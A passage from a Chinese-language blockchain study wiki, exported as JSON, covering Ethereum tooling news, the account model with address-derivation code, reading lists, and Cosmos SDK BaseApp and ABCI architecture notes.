v0.6.12\n\n\nFoundry：\n\nforge-std v1.5.0：控制台颜色/样式的 StdStyle，左/右显示断言失败，ERC721 和 ERC1155 交易作弊，assertEqCall 和 expectCall 的最小 gas 变体\nFoundry 脚本基础抽象合约\n\n\n\nTrail of Bits ： ABDKMath64x64, ERC20 和 ERC4626 的可重用属性，与 Echidna 模糊或 Foundry 单元测试一起用\n\n\nOpenZeppelin v4.8.2：修复了合约ERC721Consecutive 当 _mintConsecutive 用于大小为1的批次时，可能导致余额溢出的错误。\n\n\n未经检查的计数器：+ 用户定义的运算符，用以提高unchecked的循环的可读性\n\n\n汇编中的位移位和掩码(Yul)\n\n\nPoseidon-huff : Poseidon 哈希函数移植到 Huff\n\n\nFe（语言）v0.21.0-alpha：自类型、最大/最小特征以及数字类型的实现\n\n\nwagmi ABIType v0.6：添加人类可读的 ABI 类型级别和运行时解析实用程序\n\n\n入门套件：\n\n构建前端：wagmi、RainbowKit、Next.js；加上消息签名，使用以太坊登录和合约部署\nOptimism 入门：wagmi、Foundry、RainbowKit &amp; Vite；及 Optimism attestation station\n\n\n\ntx2uml v1.1.0：增加了新的value命令，用来生成值转移的 UML 序列图标\n\n\nSybil Form：用 Gitcoin Passport 的抗女巫形式\n\n\nTenderly Faucet：通过水龙头分叉网络和资金地址\n\n\nCTF挑战：\n\nCurta CTF 协议直播\nSussy Huff 挑战\nEKO2022 CTF 元宇宙超市解决方案\nDamn Vulnerable DeFi v3Unstoppable 的解决方案\nSecureum RACE #15：8 个问题 Solidity 测验和答案\n\n\n\nFusion zkRollup： Rust 的实验性简单rollup\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/浅谈以太坊/浅谈以太坊之账户模型":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/浅谈以太坊/浅谈以太坊之账户模型","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/浅谈以太坊/浅谈以太坊之账户模型.md","title":"浅谈以太坊之账户模型","links":[],"tags":[],"content":"\n浅谈以太坊之账户模型\n文章集合：github.com/blockchainGuide\n如有不对的地方，请留言指正，欢迎关注交个朋友。\n\n账户类型\n外部账户\n外部账户(EOAs)：通过独立私钥创建，无法进行多签。\n外部账户是拥有以太币余额的，它是由自己的私钥控制，且可以发送交易以及执行合约代码，注意没有与之相关的代码，也可以进行多重签名。\n合约账户\n合约帐户(contract account)：由 SHA3 哈希算法生成。\n合约账户是由合约创建或者外部账户创建，一旦创建成功会被分配一个账户地址。并且是只能通过外部账户来调用合约执行合约代码。\n两者之间区别\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nitemEOAscontract account私钥生成√×拥有余额√√拥有代码×√多重签名×√控制方式私钥通过外部账户执行合约\n\n合约账户地址生成\n合约地址生成算法有目前有两种：\n①：通过创建者的地址和该交易的随机数进行哈希后截取生成\n\nKeccak256(rlp([sender,nonce])[12:]\n\nfunc CreateAddress(b common.Address, nonce uint64) common.Address {\n    data, _ := rlp.EncodeToBytes([]interface{}{b, nonce})\n    return common.BytesToAddress(Keccak256(data)[12:])\n}\n②：为了不与第一种发生地址冲突，部署合约前就可以知道确切的合约地址 ，详情请查看 EIP1014\n\nkeccak256( 0xff ++ address ++ salt ++ keccak256(init_code))[12:]\n\nfunc CreateAddress2(b common.Address, salt [32]byte, inithash []byte) common.Address {\n    return common.BytesToAddress(Keccak256([]byte{0xff}, b.Bytes(), salt[:], inithash)[12:])\n}\n简单应用\nvar util = require(&#039;ethereumjs-util&#039;);\n \n//根据发送者地址和nonce求取生成的新合约的地址\n \n//方法一：先RLP编码，再Hash，截取Hash值的后20个字节\nvar sender = &quot;a990077c3205cbDf861e17Fa532eeB069cE9fF96&quot;;\nvar nonce = 0;   \n \n//由于RLP编码规则，当nonce==0时，RLP编码要使用null\nvar buf = [Buffer.from(sender, &quot;hex&quot;), nonce == 0 ? null : nonce];\nvar addr1 = util.sha3(util.rlp.encode(buf)).toString(&quot;hex&quot;).slice(-40);\n \nconsole.log(addr1);\n \n//方法二\nvar addr2 = util.generateAddress(Buffer.from(sender, &quot;hex&quot;), nonce).toString(&quot;hex&quot;);\nconsole.log(addr2);\n当我们想把一个合约部署到一个固定的地址上时，我们可以通过使用指定的sender和nonce就可以做得到。比如：EIP1820和EIP 2470正是这么做的。\n\n如何判断一个地址为合约地址\nEVM 提供了一个操作码 EXTCODESIZE，用来获取地址相关联的代码长度，若是外部账号地址，则没有代码返回。\nfunction isContract(address addr) internal view returns (bool) {\n    uint256 size;\n    assembly { size := extcodesize(addr) }\n    return size &gt; 0;\n  }\n若是在合约外部判断，则可以使用以下方式判断：\n①：web3\nweb3.eth.getCode(&quot;0x8415A51d68e80aebb916A6f5Dafb8af18bFE2F9d&quot;)\n&quot;0x&quot;\n②:JSON-RPC\neth_getcode\ngetCode用来获取参数地址所对应合约的代码，若参数是外部账号地址，则返回0x, 若参数是合约，则返回对应的字节码。\n注意：如果一个地址没有代码关联，并不能肯定这个地址是外部账户地址还是合约地址，因为有可能代码还没有部署上链。如果一个地址关联有代码，那它肯定是合约地址。\n常见需求解决\n\n只允许外部账户调用我们的合约，不允许合约账户调用我们的合约??\n\n解决方式：\nrequire(tx.origin == msg.sender)\n\n账户数据结构\n不管是外部账户还是合约账户均是采取此结构。但是外部账户无内部存储数据和合约代码，即 CodeHash 为空值。\ntype Account struct {\n\tNonce    uint64\n\tBalance  *big.Int\n\tRoot     common.Hash \n\tCodeHash []byte\n}\n\nNonce：如果是外部账户，nonce代表从此账户地址发送的交易序号。如果是合约账户，nonce代表此账户创建的合约序号\nBalance：此地址拥有Wei的数量, 1Ether=10^18Wei\nRoot: Merkle Patricia Tree 的根节点Hash值,默认空值。\nCodeHash：此账户EVM代码的hash值。对于合约账户，就是被Hash的代码；对于外部拥有账户，c是一个空字符串的Hash值\n\n账户数据存储\nimport(...)\nvar toAddr =common.HexToAddress\nvar toHash =common.BytesToHash\n \nfunc main()  {\n    statadb, _ := state.New(common.Hash{},\n        state.NewDatabase(rawdb.NewMemoryDatabase()))// ❶\n \n    acct1:=toAddr(&quot;0x0bB141C2F7d4d12B1D27E62F86254e6ccEd5FF9a&quot;)// ❷\n    acct2:=toAddr(&quot;0x77de172A492C40217e48Ebb7EEFf9b2d7dF8151B&quot;)\n \n    statadb.AddBalance(acct1,big.NewInt(100))\n    statadb.AddBalance(acct2,big.NewInt(888))\n \n    contract:=crypto.CreateAddress(acct1,statadb.GetNonce(acct1))//❸\n    statadb.CreateAccount(contract)\n    statadb.SetCode(contract,[]byte(&quot;contract code bytes&quot;))//❹\n \n    statadb.SetNonce(contract,1)\n    statadb.SetState(contract,toHash([]byte(&quot;owner&quot;)),toHash(acct1.Bytes()))//❺\n    statadb.SetState(contract,toHash([]byte(&quot;name&quot;)),toHash([]byte(&quot;ysqi&quot;)))\n \n    statadb.SetState(contract,toHash([]byte(&quot;online&quot;)),toHash([]byte{1})\n    statadb.SetState(contract,toHash([]byte(&quot;online&quot;)),toHash([]byte{}))//❻\n \n    statadb.Commit(true)//❼\n    fmt.Println(string(statadb.Dump()))//❽\n}\n上面代码中，我们创建了三个账户，并且提交到数据库中。最终打印出当前数据中所有账户的数据信息：\n\n❶ 一行代码涉及多个操作。首先是创建一个内存KV数据库，再包装为 stata 数据库实例， 最后利用一个空的DB级的StateRoot，初始化一个以太坊 statadb。\n❷ 定义两个账户 acct1和acct2，并分别添加100和888到账户余额。\n❸ 模拟合约账户的创建过程，由外部账户 acct1 创建合约账户地址，并将此地址载入 statadb。\n❹ 在将合约代码加入刚刚创建的合约账户中，在写入合约代码的同时， 会利用crypto.Keccak256Hash(code)计算合约代码哈希，保留在账户数据中。\n❺ 模拟合约执行过程，涉及修改合约状态，新增三项状态数据owner,name和online，分别对应不同值。\n❻ 这里和前面不同的是，是给状态online赋值为空[]byte{}，因为所有状态的默认值均是[]byte{}， 在提交到数据库时，如Leveldb 认为这些状态无有效值，会从数据库文件中删除此记录。 因此，此操作实际是一个删除状态online操作。\n❼ 上面所有操作，还都只是发生在 statdb 内存中，并未真正的写入数据库文件。 执行Commit，才会将关于 statadb 的所有变更更新到数据库文件中。\n❽ 一旦提交数据，则可以使用 Dump 命令从数据库中查找此 stata 相关的所有数据，包括所有账户。 并以 JSON 格式返还。这里，我们将返还结果直接打印输出。\n\n代码执行输出结果如下:\n{\n    &quot;root&quot;: &quot;3a25b0816cf007c0b878ca7a62ba35ee0337fa53703f281c41a791a137519f00&quot;,\n    &quot;accounts&quot;: {\n        &quot;0bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;: {\n            &quot;balance&quot;: &quot;100&quot;,\n            &quot;nonce&quot;: 0,\n            &quot;root&quot;: &quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;,\n            &quot;codeHash&quot;: &quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;,\n            &quot;code&quot;: &quot;&quot;,\n            &quot;storage&quot;: {}\n        },\n        &quot;77de172a492c40217e48ebb7eeff9b2d7df8151b&quot;: {\n            &quot;balance&quot;: &quot;888&quot;,\n            &quot;nonce&quot;: 0,\n            &quot;root&quot;: &quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;,\n            &quot;codeHash&quot;: &quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;,\n            &quot;code&quot;: &quot;&quot;,\n            &quot;storage&quot;: {}\n        },\n        &quot;80580f576731dc1e1dcc53d80b261e228c447cdd&quot;: {\n            &quot;balance&quot;: &quot;0&quot;,\n            &quot;nonce&quot;: 1,\n            &quot;root&quot;: &quot;1f6d937817f2ac217d8b123c4983c45141e50bd0c358c07f3c19c7b526dd4267&quot;,\n            &quot;codeHash&quot;: &quot;c668dac8131a99c411450ba912234439ace20d1cc1084f8e198fee0a334bc592&quot;,\n            &quot;code&quot;: &quot;636f6e747261637420636f6465206279746573&quot;,\n            &quot;storage&quot;: {\n                &quot;000000000000000000000000000000000000000000000000000000006e616d65&quot;: &quot;8479737169&quot;,\n                &quot;0000000000000000000000000000000000000000000000000000006f776e6572&quot;: &quot;940bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;\n            }\n        }\n    }\n}\n我们看到这些显示数据，直接对应我们刚刚的所有操作。 也只有合约账户才有 storage 和 code。而外部账户的codeHash和root值相同，是一个默认值。\n账户模型的优缺点\n优点：\n\n合约以代码形式保存在 Account 中，并且 Account 拥有自身状态。这种模型具有更好的可编程性。\n批量交易的成本较低。设想矿池向矿工支付手续费，Account 模型可以通过合约的方式降低成本。\n\n缺点：\n\nAccount 模型交易之间没有依赖性，需要解决重放问题。\n对于实现闪电网络/雷电网络，Plasma 等，用户举证需要更复杂的 Proof 证明机制，子链向主链进行状态迁移需要更复杂的协议。\n\n参考\n\nmindcarver.cn/\ngithub.com/blockchainGuide/\nlearnblockchain.cn/books/geth/part/account.html\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/生态":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/生态","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/生态.md","title":"生态","links":["tags/SupportEIP1559"],"tags":["SupportEIP1559"],"content":"\n看看你有哪些可以申领的空投和 POAP\nMarketMake 和 EthDenver 的黑客松作品，以及 MarketMake 和 EthDenver 的优胜作品\nCoingecko 现已支持将 token 信息快速导入 MetaMask\nEtherscan 现已支持显示标准类型交易的成本\nSecureum 写了更多教程教大家怎么看审计报告\n虽然大家一直都知道 EIP-1559 是有史以来最受欢迎的 EIP，但还是有一个 SupportEIP1559 运动\n几个可能令 eth staker 难堪的事实\nETHIndia (ETHGlobal) 12 个入围项目\nConsenSys发布zkEVM（EVM 等效） 私有测试网\nMailChain 支持 ENS 发送邮件\nRollups 网络交易量接近以太坊主网\n以太坊的随机数使用SNARKs和VDFs\n使用[Nym来匿名化RPC调用]的概念证明(github.com/EdenBlockVC/spook)\nPeltaShield：通过RPC调用模拟你的交易的工具\nEthunwrapp：回顾你在2022年的链上活动\nZkitter：可以用你的用户名或匿名发帖，公钥写在Arbitrum上用来以恢复账户。使用了各种zk工具： Interep, RLN, Semaphore\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/论文":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/论文","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/论文.md","title":"论文","links":[],"tags":[],"content":"\n\nQin, Zhou, Gervais 论文：量化 MEV\n\n\nWerner, Perez, et al, 论文：DeFi 知识的系统化\n\n\n如何用多项式承诺打造 SNARKs\n\n\n验证密码学实现 constant-timeness 属性的工具的现状\n\n\nKyber 论证动态 AMMs（弹性手续费和定价曲线）的论文\n\n\nVitalik：牢不可破的多项式承诺是如何工作的\n\n\n可聚合密钥的分布式生成\n\n\nMatterLabs 正在计划一种链下数据可得性安全模型\n\n\nDankrad Feist 解释 51% 攻击的作恶边界\n\n\nVitalik：区块链可扩展性的局限\n\n\n共用品问题即是协作问题\n\n\n使用多项式承诺在链下聚合投票并在链上验证的设计\n\n\nMatthew Ball：Metaverse 指南\n\n\nVitalik：带有已知份额的 M-of-N 密钥分割\n\n\n可公开审计的 MPC 作为一项服务：可以简洁地验证以及用作通用的启动设置\n\n\nBarnabé: Proposer-Builder Separation (PBS) 研究现状\n\n\nReorg 在 post-SSF(single slot finality) LMD-GHOST 的重组弹性与安全性\n\n\n高效的BLS多签EVM证明\n\n\nMinRoot：VDF 的候选顺序函数\n\n\n优化见证打包。Lighthouse 当前贪婪算法在52.3%的测试实例中产生了最优解，并在99.97%的测试实例中产生了离最优解5%以内的解\n\n\n块拍卖 vs 槽拍卖 Proposer-Builder Separation (PBS)\n\n\nFlashbots: 在SGX（Software Guard Extensions 提供可信计算环境）内运行Geth\n\n\nJames Prestwich：MEV 社区历史\n\n\n完全知识证明 (CK)：使用 TEE 和挖矿 ASIC 防止泄密\n\n\n关于快速摊销 KZG 证明的注意事项\n\n\nGradual Dutch Auctions（渐进式荷兰拍卖会） [PDF] 可以修改为与激励兼容\n\n\n对 AI 原语进行基准 zk 证明，使用证明生成时间和峰值证明者内存使用量的指标\n\n\n网络性能指标：产生的价值（福利）和用户获得的价值（盈余）\n\n\nRollup 中继，减少 PBS 中继中的信任假设\n\n\n用延迟披露、前包含列表或平行拍卖实现抗审查\n\n\n最近最新消息驱动 GHOST：同步动态可用，对有界异步周期具有弹性，建议替代 Gasper 的 LMD-GHOST\n\n\n简单单Slot最终性提案，同步动态可用协议和最终性小工具\n\n\n订单流拍卖 (OFA)分析\n\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/anatomy_baseapp":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/anatomy_baseapp","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/anatomy_baseapp.md","title":"anatomy_baseapp","links":[],"tags":[],"content":"app组成\n\n引用baseapp,它实现了ABCI接口和路由逻辑\nstore keys列表：持久化其状态数据\nkeeper列表:处理模块存储的读写\n对appCodec的引用:应用程序的appCodec用于序列化和反序列化数据结构以存储它们，因为存储只能持久化[]字节,默认protobuf\n对模块管理器和基本模块管理器的引用：模块管理器是一个包含应用程序模块列表的对象。它方便了与这些模块相关的操作，例如注册它们的Msg服务和gRPC查询服务，或者为InitChainer、BeginBlocker和EndBlocker等各种函数设置模块之间的执行顺序\n\ninitChainer\nInitChainer是一个从genesis文件初始化应用程序状态的函数（即genesis帐户的令牌余额）。当应用程序从CometBFT引擎接收到InitChain消息时会调用它，当节点在appBlockHeight==0（即在genesis上）启动时会发生这种情况。应用程序必须通过SetInitChainer方法在其构造函数中设置InitChainer。\n通常，InitChainer主要由每个应用程序模块的InitGenesis函数组成。这是通过调用模块管理器的InitGenesis函数来完成的，该函数反过来调用它所包含的每个模块的InitGenesis函数。请注意，必须使用模块管理器的SetOrderInitGenesis方法在模块管理器中设置调用模块InitGeness函数的顺序。这是在应用程序的构造函数中完成的，并且必须在SetInitChainer之前调用SetOrderInitGenesis。\nBeginBlocker and EndBlocker\nCosmos SDK为开发人员提供了将代码自动执行作为应用程序一部分的可能性。这是通过两个称为BeginBlocker和EndBlocker的函数实现的。当应用程序从CometBFT引擎接收到BeginBlock和EndBlock消息时，会调用它们，这分别发生在每个块的开头和结尾。应用程序必须通过SetBeginBlocker和SetEndBlocker方法在其构造函数中设置BeginBlockers和EndBlocker。\n通常，BeginBlocker和EndBlocker函数主要由应用程序的每个模块的BeginBlock和EndBlock函数组成。这是通过调用模块管理器的BeginBlock和EndBlock函数来完成的，模块管理器依次调用它所包含的每个模块的BeginBlock和EndBlock功能。请注意，必须分别使用SetOrderBeginBlockers和SetOrderEndBlockers方法在模块管理器中设置模块的BeginBlock和EndBlock函数的调用顺序。这是通过应用程序构造函数中的模块管理器完成的，并且必须在SetBeginBlocker和SetEndBlocker函数之前调用SetOrderBeginBlockers和SetOrderEndBlockers方法。\n顺便说一句，重要的是要记住，特定于应用程序的区块链是确定性的。开发者必须小心不要在BeginBlocker或EndBlocker中引入非决定论，也必须小心不要使它们在计算上过于昂贵，因为天然气不会限制BeginBlock和EndBlocker的成本\nRegister Codec\nEncodingConfig结构是app.go文件的最后一个重要部分。这个结构的目标是定义将在整个应用程序中使用的编解码器。\ntype EncodingConfig struct {\n\tInterfaceRegistry types.InterfaceRegistry\n\tCodec             codec.Codec\n\tTxConfig          client.TxConfig\n\tAmino             *codec.LegacyAmino\n}\nmodules\n模块是Cosmos SDK应用程序的核心和灵魂。它们可以被视为嵌套在状态机中的状态机。当事务通过ABCI从底层CometBFT引擎中继到应用程序时，它会由baseapp路由到适当的模块以便进行处理。这种范式使开发人员能够轻松地构建复杂的状态机，因为他们需要的大多数模块通常已经存在。对于开发人员来说，构建Cosmos SDK应用程序所涉及的大部分工作都围绕着构建应用程序所需的自定义模块展开，这些模块还不存在，并将它们与已经存在的模块集成到一个连贯的应用程序中。在应用程序目录中，标准做法是将模块存储在x/文件夹中（不要与Cosmos SDK的x/文件夹混淆，后者包含已构建的模块）\nApplication Module Interface\n模块必须实现Cosmos SDK、AppModuleBasic和AppModule中定义的接口。前者实现模块的基本非依赖元素，如编解码器，而后者处理大部分模块方法（包括需要引用其他模块的保持器的方法）。按照惯例，AppModule和AppModuleBasic类型都是在一个名为module.go的文件中定义的。\nAppModule在模块上公开了一组有用的方法，这些方法有助于将模块组合成一个连贯的应用程序。这些方法是从模块管理器调用的，模块管理器管理应用程序的模块集合。\nMsg service\n每个应用程序模块定义两个Protobuf服务：一个Msg服务用于处理消息，另一个gRPC查询服务用于处理查询。如果我们将模块视为一个状态机，那么Msg服务就是一组状态转换RPC方法。每个Protobuf-Msg服务方法都与Protobuf请求类型1:1相关，该请求类型必须实现sdk.Msg接口。请注意，sdk.Msgs捆绑在事务中，每个事务包含一个或多个消息。\n当完整节点接收到有效的事务块时，CometBFT通过DeliverTx将每个事务块中继到应用程序。然后，应用程序处理事务：\n在接收到事务后，应用程序首先从[]字节对其进行解组。\n然后，在提取交易中包含的Msg之前，它会验证交易的一些内容，如费用支付和签名。\n消息使用Protobuf-Anys进行编码。通过分析每个Any的type_url，baseapp的msgServiceRouter将sdk.Msg路由到相应模块的Msg服务。\n如果消息处理成功，则状态会更新。\n模块开发人员在构建自己的模块时会创建自定义的Msg服务。一般做法是在tx.proto文件中定义Msg-Protobuf服务。例如，x/bank模块定义了一个服务，该服务具有两种传输令牌的方法\n// Msg defines the bank Msg service.\nservice Msg {\n  option (cosmos.msg.v1.service) = true;\n \n  // Send defines a method for sending coins from one account to another account.\n  rpc Send(MsgSend) returns (MsgSendResponse);\n \n  // MultiSend defines a method for sending coins from some accounts to other accounts.\n  rpc MultiSend(MsgMultiSend) returns (MsgMultiSendResponse)\n}\nkeeper\nKeeper是模块存储的看门人。要在模块的存储中读取或写入，必须通过其keeper的方法之一。这是通过Cosmos SDK的对象能力模型来确保的。只有持有存储区密钥的对象才能访问它，并且只有模块的管理员才能持有模块存储区的密钥。\nkeeper通常在一个名为keeper.go的文件中定义。它包含keeper的类型定义和方法。"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/bc_architecture":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/bc_architecture","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/bc_architecture.md","title":"bc_architecture","links":[],"tags":[],"content":"CometBFT\nCometBFT是一个与应用程序无关的引擎，负责处理区块链的网络层和共识层。在实践中，这意味着CometBFT负责传播和排序事务字节。CometBFT依赖于同名的拜占庭容错（BFT）算法来就事务顺序达成共识。\nCometBFT共识算法使用一组称为Validators的特殊节点。验证器负责将交易块添加到区块链中。在任何给定的块上，都有一个验证器集V。算法选择V中的验证器作为下一个块的提议者。如果超过三分之二的V在其上签署了prevote和precommit，并且它包含的所有事务都是有效的，则该块被认为是有效的。验证程序集可以通过在状态机中编写的规则进行更改。\n                ^  +-------------------------------+  ^\n                |  |                               |  |   Built with Cosmos SDK\n                |  |  State-machine = Application  |  |\n                |  |                               |  v\n                |  +-------------------------------+\n                |  |                               |  ^\nBlockchain node |  |           Consensus           |  |\n                |  |                               |  |\n                |  +-------------------------------+  |   CometBFT\n                |  |                               |  |\n                |  |           Networking          |  |\n                |  |                               |  |\n                v  +-------------------------------+  v\nABCI\nCometBFT通过一个名为ABCI的接口将事务传递给应用程序，应用程序必须实现ABCI.\n              +---------------------+\n              |                     |\n              |     Application     |\n              |                     |\n              +--------+---+--------+\n                       ^   |\n                       |   | ABCI\n                       |   v\n              +--------+---+--------+\n              |                     |\n              |                     |\n              |       CometBFT      |\n              |                     |\n              |                     |\n              +---------------------+\nCometBFT只处理事务字节。它不知道这些字节是什么意思。CometBFT所做的只是对这些事务字节进行确定性排序。CometBFT通过ABCI将字节传递给应用程序，并期望返回代码通知它事务中包含的消息是否已成功处理.\n以下是ABCI最重要的信息：\nCheckTx：当CometBFT接收到一个事务时，它会被传递给应用程序，以检查是否满足一些基本要求。CheckTx用于保护完整节点的内存池免受垃圾邮件交易的影响。一个称为AnteHandler的特殊处理程序用于执行一系列验证步骤，如检查是否有足够的费用和验证签名。如果检查有效，则将事务添加到内存池并中继到对等节点。请注意，由于事务还没有被包括在块中，所以不使用CheckTx处理事务（即不发生状态修改）。\nDeliverTx：当CometBFT接收到有效块时，块中的每个事务都会通过DeliverTx传递给应用程序以便进行处理。正是在这个阶段，状态转换才会发生。AnteHandler与事务中每个消息的实际Msg服务RPC一起再次执行。\nBeginBlock/EndBlock：无论块是否包含事务，这些消息都在每个块的开头和结尾执行。触发逻辑的自动执行是很有用的。不过，请谨慎操作，因为计算成本高昂的循环可能会减慢区块链的速度，如果循环是无限的，甚至会冻结它。\nstate change\n        -----------------------\n        |Receive Block Proposal|\n        -----------------------\n                  |\n              v\n        -----------------------\n        | BeginBlock          |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | DeliverTx(tx0)      |\n        | DeliverTx(tx1)      |\n        | DeliverTx(tx2)      |\n        | DeliverTx(tx3)      |\n        |   .         |\n        |   .         |\n        |   .         |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | EndBlock        |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | Consensus       |\n        -----------------------\n                  |\n              v\n        -----------------------\n        | Commit          |\n        -----------------------"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/core_baseapp":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/core_baseapp","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/core_baseapp.md","title":"core_baseapp","links":[],"tags":[],"content":"概述\nBaseApp是实现Cosmos SDK应用程序核心的基本类型，用于状态机与底层共识引擎（例如CometBFT）通信。\nBaseApp的目标是提供Cosmos SDK应用程序的基本层，开发人员可以轻松扩展该层以构建自己的自定义应用程序。通常，开发人员会为他们的应用程序创建一个自定义类型.\n初始化参数\n\nCommitMultiStore:\nMsg Service Router:\ngRPC Query Router:\nTxDecoder:\nAnteHandler:\nInitChainer\nBeginBlocker\nEndBlocker`:\n\n缓存状态参数\n\ncheckState ：此状态在CheckTx期间更新，并在提交时重置。\ndeliverState ：此状态在DeliverTx期间更新，在Commit时设置为nil，并在BeginBlock上重新初始化\nprocessProposalState\nprepareProposalState\n\n状态更新\nBaseApp维护四个主要的易失性状态和一个根或主状态。主状态是应用程序的规范状态，而不稳定状态checkState、deliveryState、prepareProposalState、processPreposalState用于处理提交过程中主状态之间的状态转换。\n在内部，只有一个CommitMultiStore，我们称之为主状态或根状态。从这个根状态，我们通过使用一种称为存储分支的机制（由CacheWrap函数执行）导出四个易失性状态。类型如下所示：\n\nInitChain State Updates\n在InitChain过程中，通过分支根CommitMultiStore来设置四种易失性状态，checkState、prepareProposalState、processProposalState和deliveryState。任何后续的读取和写入都发生在CommitMultiStore的分支版本上。为了避免不必要的到主状态的往返，对分支存储的所有读取都被缓存。\n\nCheckTx State Updates\n在CheckTx期间，基于根存储中最后一个提交状态的checkState用于任何读取和写入。在这里，我们只执行AnteHandler，并验证事务中每个消息都存在服务路由器。注意，当我们执行AnteHandler时，我们对已经分支的checkState进行分支。这有一个副作用，即如果AnteHandler失败，状态转换将不会反映在checkState中——即checkState只在成功时更新。\n\nPrepareProposal State Updates\n在PrepareProposal期间，通过分支根CommitMultiStore来设置prepareProposalState。prepareProposalState用于在PrepareProposal阶段发生的任何读取和写入。该函数使用内存池的Select（）方法来迭代事务。然后调用runTx，它对每个事务进行编码和验证，然后执行AnteHandler。如果成功，将返回有效的事务，包括在执行建议期间生成的事件、标记和数据。所描述的行为是默认处理程序的行为，应用程序可以灵活地定义自己的自定义内存池处理程序。\n\nProcessProposal State Updates\n在ProcessProposal过程中，processProposalState是根据根存储中的最后一个提交状态设置的，用于处理从验证器接收的签名提案。在这种状态下，调用runTx并执行AnteHandler，并且在这种状态中使用的上下文是用来自标头和主状态的信息构建的，包括也设置的最低天然气价格。我们再次强调，所描述的行为是默认处理程序的行为，应用程序可以灵活地定义自己的自定义内存池处理程序\n\nBeginBlock State Updates\n在BeginBlock期间，deliveryState被设置为在随后的DeliverTx ABCI消息中使用。deliveryState基于根存储中最后一个提交的状态，并且是分支的。请注意，deliveryState在提交时设置为nil。\n\nDeliverTx State Updates\nDeliverTx的状态流几乎与CheckTx相同，只是deliveryState上发生状态转换，并且执行事务中的消息。与CheckTx类似，状态转换发生在双分支状态deliveryState上。成功执行消息会导致写入被提交到deliveryState。请注意，如果消息执行失败，来自AnteHandler的状态转换将被持久化。\n\nCommit State Updates\n在提交过程中，deliveryState中发生的所有状态转换最终都会写入根CommitMultiStore，然后提交到磁盘并生成新的应用程序根哈希。这些状态转换现在被认为是最终的。最后，checkState设置为新提交的状态，deliveryState设置为nil以在BeginBlock上重置\n\nParamStore\n在InitChain过程中，RequestInitChaine提供ConsensusParams，其中除了证据参数外，还包含与区块执行相关的参数，如最大气体和大小。如果这些参数不是nil，则在BaseApp的ParamStore中进行设置。在幕后，ParamStore由x/consensus_params模块管理。这允许通过链上治理来调整参数\nService Routers\n当应用程序接收到消息和查询时，必须将它们路由到适当的模块才能进行处理。路由是通过BaseApp完成的，它为消息保存一个msgServiceRouter，为查询保存一个grpcQueryRouter。"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos-sdk概览":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/cosmos-sdk概览","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/cosmos sdk概览.md","title":"cosmos sdk概览","links":[],"tags":[],"content":"cosmos sdk 简介\nCosmos SDK是一个开源框架，用于构建多资产公共权益证明（PoS）区块链，以及许可的授权证明（PoA）区块链。\nCosmos SDK的目标是让开发人员能够轻松地从头开始创建自定义区块链，从而与其他区块链进行本地互操作。基于SDK的区块链是由可组合模块构建的，构建在CometBFT之上。其中大多数是开源的，任何开发者都可以随时使用。任何人都可以为Cosmos SDK创建一个模块，集成已经构建的模块就像将它们导入区块链应用程序一样简单。\ncosmos 应用链设计架构\n                ^  +-------------------------------+  ^\n                |  |                               |  |   Built with Cosmos SDK\n                |  |  State-machine = Application  |  |\n                |  |                               |  v\n                |  +-------------------------------+\n                |  |                               |  ^\nBlockchain node |  |           Consensus           |  |\n                |  |                               |  |\n                |  +-------------------------------+  |   CometBFT\n                |  |                               |  |\n                |  |           Networking          |  |\n                |  |                               |  |\n                v  +-------------------------------+  v\n为什么要用cosmos sdk 构建链\n\nCosmos SDK是开源的，随着开源Cosmos SDK模块生态系统的发展，使用它构建复杂的去中心化平台将变得越来越容易。\n已经在生产环境中被许多知名项目使用\n灵活\n\n可以使用多种不同语言构建状态机，cosmos sdk 使用最广泛\n开发人员可以自行根据自己需求权衡，比如是否使用SDK中提供的账户模型或者DB等\n可以自己选择加密库，不受像拥有虚拟机区块链底层环境限制\n\n\n性能方面的优势\n\n基于cometBFT「在整个行业中被广泛使用，并被认为是构建风险证明系统的黄金标准共识引擎」共识，吞吐量远超Pow\n构建的特定应用链不会争抢资源和计算能力，比如以太坊的智能合约，经常会遇到交易堵塞，即使在layer2 ，也会受限。\n基于虚拟机来解释事务会显著增加计算复杂性\n\n\n安全\n\ndis 